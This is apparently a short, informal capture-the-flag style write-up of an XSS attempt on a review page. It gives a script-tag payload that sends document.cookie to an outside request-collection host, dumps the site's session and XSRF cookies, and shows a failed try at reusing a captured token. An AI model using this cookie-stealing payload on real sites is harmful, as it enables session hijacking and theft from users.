I first tryed to XSS the page and it worked so I gone ahead and create a XSS payload

**<script>fetch('https://hookb.in/Z2mmp6mNZnSR33eLJ6R1?cookie=' + document.cookie)</script>**

This is the cookie on the site:

```
[
    {
        "domain": "35.198.183.125",
        "expirationDate": 1607358623.882555,
        "hostOnly": true,
        "httpOnly": true,
        "name": "manual_review_session",
        "path": "/",
        "sameSite": "lax",
        "secure": false,
        "session": false,
        "storeId": null,
        "value": "eyJpdiI6IjZGZ0FYTldNR083aTdDTVNJcEJndEE9PSIsInZhbHVlIjoiMGJqdlRDbDNxL0U1eVdnR2loUXZpR0VLa2ZzOVEzM1NXb1hCMlg3ZS9NUXN3ZlJYK0haM2RkanpxbW5OMllVZzM4NGhST2ZKQ3VXRnd6ajAxUVM1bFhVbllzNDZUdmxiczByUTFIZi81UHBFZU1PVGRUVGh6QzFQd0I3ZGo5dFQiLCJtYWMiOiI4ZjJkNTU4Yzc5MDA0ZGFlYmQ0YjA4MzE0OTdmY2UzZjE1MmU2NmUyZmVjOWY4ODVhODBiNGM3ZjE3MjFmNGY1In0%3D"
    },
    {
        "domain": "35.198.183.125",
        "expirationDate": 1607358623.882504,
        "hostOnly": true,
        "httpOnly": false,
        "name": "XSRF-TOKEN",
        "path": "/",
        "sameSite": "lax",
        "secure": false,
        "session": false,
        "storeId": null,
        "value": "eyJpdiI6Ik5MZGh0ZlpZUy9DaFkvdkVhVExBM1E9PSIsInZhbHVlIjoiUDVMZWdvL2VyanpQT3pNcXorUWkxd2pTZzBWVEwxNzVpVnE0dDFWRU9uek5EVDZ1c09XMmhPRFZxWXdHZkpva0JDRmkvbms1TkJ4Z0JKVzRNYTBBRmdMQWJYZHJqais2MDlSbzNSeHZMUGVEN3BBbVp6d2M5WnE1aGphTjNRaGkiLCJtYWMiOiIwODgzNzNhMDQyZTBiNTA2NTcwNDVlNGQyNTM0MjczMDQxMmRhMzAyOGEwZjkwYTY1MTZiNDllMGE4ZjQzMjgzIn0%3D"
    }
]
```

and whith this trick i got this cookie **XSRF-TOKEN=eyJpdiI6Ik5MZGh0ZlpZUy9DaFkvdkVhVExBM1E9PSIsInZhbHVlIjoiUDVMZWdvL2VyanpQT3pNcXorUWkxd2pTZzBWVEwxNzVpVnE0dDFWRU9uek5EVDZ1c09XMmhPRFZxWXdHZkpva0JDRmkvbms1TkJ4Z0JKVzRNYTBBRmdMQWJYZHJqais2MDlSbzNSeHZMUGVEN3BBbVp6d2M5WnE1aGphTjNRaGkiLCJtYWMiOiIwODgzNzNhMDQyZTBiNTA2NTcwNDVlNGQyNTM0MjczMDQxMmRhMzAyOGEwZjkwYTY1MTZiNDllMGE4ZjQzMjgzIn0=** and the ip ** 86.125.4.95**
So the new token is 
```
[
    {
        "domain": "86.125.4.95",
        "expirationDate": 1907358623.882555,
        "hostOnly": true,
        "httpOnly": true,
        "name": "manual_review_session",
        "path": "/",
        "sameSite": "lax",
        "secure": false,
        "session": false,
        "storeId": null,
        "value": "eyJpdiI6Ik5MZGh0ZlpZUy9DaFkvdkVhVExBM1E9PSIsInZhbHVlIjoiUDVMZWdvL2VyanpQT3pNcXorUWkxd2pTZzBWVEwxNzVpVnE0dDFWRU9uek5EVDZ1c09XMmhPRFZxWXdHZkpva0JDRmkvbms1TkJ4Z0JKVzRNYTBBRmdMQWJYZHJqais2MDlSbzNSeHZMUGVEN3BBbVp6d2M5WnE1aGphTjNRaGkiLCJtYWMiOiIwODgzNzNhMDQyZTBiNTA2NTcwNDVlNGQyNTM0MjczMDQxMmRhMzAyOGEwZjkwYTY1MTZiNDllMGE4ZjQzMjgzIn0="
    },
    {
        "domain": "86.125.4.95",
        "expirationDate": 1907358623.882504,
        "hostOnly": true,
        "httpOnly": false,
        "name": "XSRF-TOKEN",
        "path": "/",
        "sameSite": "lax",
        "secure": false,
        "session": false,
        "storeId": null,
        "value": "eyJpdiI6Ik5MZGh0ZlpZUy9DaFkvdkVhVExBM1E9PSIsInZhbHVlIjoiUDVMZWdvL2VyanpQT3pNcXorUWkxd2pTZzBWVEwxNzVpVnE0dDFWRU9uek5EVDZ1c09XMmhPRFZxWXdHZkpva0JDRmkvbms1TkJ4Z0JKVzRNYTBBRmdMQWJYZHJqais2MDlSbzNSeHZMUGVEN3BBbVp6d2M5WnE1aGphTjNRaGkiLCJtYWMiOiIwODgzNzNhMDQyZTBiNTA2NTcwNDVlNGQyNTM0MjczMDQxMmRhMzAyOGEwZjkwYTY1MTZiNDllMGE4ZjQzMjgzIn0="
    }
]
```

but no luck